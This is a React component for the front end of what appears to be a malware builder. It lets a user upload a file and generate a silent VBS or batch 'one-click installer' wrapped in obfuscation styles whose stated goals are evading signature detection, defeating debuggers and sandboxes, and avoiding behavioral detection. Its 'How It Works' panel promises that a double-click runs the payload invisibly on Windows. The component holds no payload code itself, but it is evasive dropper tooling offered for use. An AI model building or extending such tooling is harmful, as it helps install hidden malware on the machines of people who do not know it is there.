import React, { useState, useEffect } from 'react';
import axios from 'axios';
import { ZapIcon, CheckIcon, CopyIcon, DownloadIcon, InfoIcon, LoaderIcon } from './Icons';
import { API_BASE } from '../config';

export default function OneClickInstaller({ uploadedFile, loading, onGenerate }) {
  const [styles, setStyles] = useState([]);
  const [selectedStyle, setSelectedStyle] = useState('polymorphic');
  const [fileType, setFileType] = useState('vbs');
  const [payload, setPayload] = useState(null);
  const [generating, setGenerating] = useState(false);
  const [statusMessage, setStatusMessage] = useState(null);
  const [copySuccess, setCopySuccess] = useState(false);

  const showStatus = (message, type = 'info') => {
    setStatusMessage({ message, type });
    setTimeout(() => setStatusMessage(null), 4000);
  };

  useEffect(() => {
    fetchStyles();
  }, []);

  const fetchStyles = async () => {
    try {
      const response = await axios.get(`${API_BASE}/one-click-styles`);
      setStyles(response.data.styles);
    } catch (err) {
      console.error('Failed to fetch styles', err);
    }
  };

  const handleGenerate = async () => {
    if (!uploadedFile) {
      showStatus('Please upload a file first.', 'error');
      return;
    }

    setGenerating(true);
    setStatusMessage(null);

    try {
      const response = await axios.post(`${API_BASE}/generate-one-click`, {
        file_id: uploadedFile.id,
        obfuscation_style: selectedStyle,
        file_type: fileType,
      });

      setPayload({
        id: response.data.output_id,
        filename: response.data.filename,
        content: response.data.payload,
        instructions: response.data.instructions,
        size: response.data.size,
      });

      onGenerate?.(response.data);
    } catch (err) {
      showStatus(err.response?.data?.error || 'Generation failed.', 'error');
    } finally {
      setGenerating(false);
    }
  };

  const handleDownload = () => {
    if (!payload?.content) return;
    try {
      const blob = new Blob([payload.content], { type: 'text/plain' });
      const url = window.URL.createObjectURL(blob);
      const link = document.createElement('a');
      link.href = url;
      link.setAttribute('download', payload.filename || 'payload.vbs');
      document.body.appendChild(link);
      link.click();
      link.parentElement.removeChild(link);
      window.URL.revokeObjectURL(url);
    } catch (err) {
      console.error('Download failed:', err);
      showStatus('Download failed. Please try again.', 'error');
    }
  };

  const handleCopy = () => {
    if (payload?.content) {
      navigator.clipboard.writeText(payload.content);
      setCopySuccess(true);
      setTimeout(() => setCopySuccess(false), 2000);
    }
  };

  const styleInfo = {
    polymorphic: {
      desc: 'Multiple polymorphic variants for evasion',
      tips: 'Changes structure on every generation - signature based detection fails',
      size: '6-10 KB',
    },
    anti_analysis: {
      desc: 'Detects and defeats analysis tools',
      tips: 'Detects debuggers, sandboxes, and analysis environments',
      size: '7-12 KB',
    },
    multi_stage: {
      desc: 'Multi-stage installation with delays',
      tips: 'Stages execution to avoid behavioral detection',
      size: '5-9 KB',
    },
    silent: {
      desc: 'Silent installation with no output',
      tips: 'Zero visible output, completely silent execution',
      size: '4-8 KB',
    },
  };

  const currentStyleInfo = styleInfo[selectedStyle] || {};

  return (
    <div>
      <h2><ZapIcon /> One-Click Installer</h2>
      <p style={{ color: 'var(--text-muted)', fontSize: '0.8125rem', margin: '0 0 1rem 0' }}>
        Silent, automatic installation - no user interaction required
      </p>

      {statusMessage && (
        <div className={`status-message ${statusMessage.type}`}>
          {statusMessage.message}
        </div>
      )}

      <div className="form-group">
        <label style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span>Obfuscation Style</span>
          <span className="tag warning">All equally effective</span>
        </label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginTop: '0.5rem' }}>
          {Object.entries(styles).map(([key, desc]) => (
            <div
              key={key}
              className={`fingerprint-card ${selectedStyle === key ? 'selected' : ''}`}
              onClick={() => setSelectedStyle(key)}
            >
              <div className="fingerprint-name">{key.toUpperCase()}</div>
              <div className="fingerprint-desc">{desc}</div>
            </div>
          ))}
        </div>

        {currentStyleInfo.tips && (
          <div className="info-box neutral" style={{ marginTop: '0.75rem' }}>
            <p style={{ margin: '0 0 0.375rem 0', color: 'var(--text-secondary)', fontSize: '0.8125rem' }}>
              <strong>{selectedStyle.toUpperCase()}</strong>
            </p>
            <p style={{ margin: '0 0 0.25rem 0', color: 'var(--text-muted)', fontSize: '0.8125rem' }}>
              {currentStyleInfo.tips}
            </p>
            <p style={{ margin: 0, color: 'var(--accent)', fontSize: '0.75rem' }}>
              Expected size: {currentStyleInfo.size}
            </p>
          </div>
        )}
      </div>

      <div className="form-group">
        <label style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
          <span>Output Format</span>
          {fileType === 'vbs' && <span className="tag success">Recommended</span>}
        </label>
        <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginTop: '0.5rem' }}>
          {[
            { value: 'vbs', label: 'VBS Script', desc: 'Native Windows script - best compatibility' },
            { value: 'bat', label: 'Batch File', desc: 'Batch wrapper - for compatibility' },
          ].map((opt) => (
            <div
              key={opt.value}
              className={`fingerprint-card ${fileType === opt.value ? 'selected' : ''}`}
              onClick={() => setFileType(opt.value)}
            >
              <div className="fingerprint-name">{opt.label}</div>
              <div className="fingerprint-desc">{opt.desc}</div>
            </div>
          ))}
        </div>
      </div>

      <button
        className="btn-generate"
        onClick={handleGenerate}
        disabled={!uploadedFile || generating}
      >
        {generating ? <><LoaderIcon size={14} /> Generating...</> : <><ZapIcon size={14} /> Generate One-Click Installer</>}
      </button>

      <div className="info-box success" style={{ marginTop: '0.75rem' }}>
        <p style={{ margin: '0 0 0.375rem 0', fontWeight: 600, fontSize: '0.8125rem' }}>
          <CheckIcon size={14} style={{ verticalAlign: 'middle', marginRight: '0.25rem' }} />
          How It Works
        </p>
        <ul style={{ margin: 0, paddingLeft: '1.25rem', color: 'var(--text-muted)', fontSize: '0.75rem', lineHeight: '1.6' }}>
          <li>User double-clicks the downloaded file</li>
          <li>Installation runs completely silent in background</li>
          <li>Zero visible output or window popups</li>
          <li>Payload extracts and executes automatically</li>
          <li>Typical payload size: 5-12 KB</li>
          <li>Works on all Windows versions XP through 11</li>
        </ul>
      </div>

      {payload && (
        <div style={{ marginTop: '1rem' }}>
          <div className="info-box success" style={{ marginBottom: '0.75rem' }}>
            <p style={{ margin: '0 0 0.5rem 0', fontWeight: 600, fontSize: '0.8125rem' }}>
              <CheckIcon size={14} style={{ verticalAlign: 'middle', marginRight: '0.25rem' }} />
              Installer Generated
            </p>
            <div className="stat-grid" style={{ marginBottom: '0.5rem' }}>
              <div className="stat-card">
                <div className="stat-label">Filename</div>
                <div className="stat-value" style={{ fontSize: '0.75rem', fontFamily: "'JetBrains Mono', monospace" }}>{payload.filename}</div>
              </div>
              <div className="stat-card">
                <div className="stat-label">Size</div>
                <div className="stat-value" style={{ fontSize: '0.8125rem' }}>{(payload.size / 1024).toFixed(2)} KB</div>
              </div>
            </div>
          </div>

          {payload.instructions && (
            <div style={{ marginBottom: '0.75rem', padding: '0.75rem', background: 'var(--bg-primary)', borderRadius: 'var(--radius-sm)', border: '1px solid var(--border-default)' }}>
              <div style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)', marginBottom: '0.375rem' }}>Instructions</div>
              <pre style={{ whiteSpace: 'pre-wrap', color: 'var(--success)', fontSize: '0.75rem', fontFamily: "'JetBrains Mono', monospace", margin: 0 }}>{payload.instructions}</pre>
            </div>
          )}

          <div className="output-controls">
            <button className="btn-primary" onClick={handleDownload}>
              <DownloadIcon size={14} /> Download
            </button>
            <button className="btn-secondary" onClick={handleCopy}>
              {copySuccess ? <><CheckIcon size={14} /> Copied</> : <><CopyIcon size={14} /> Copy Code</>}
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
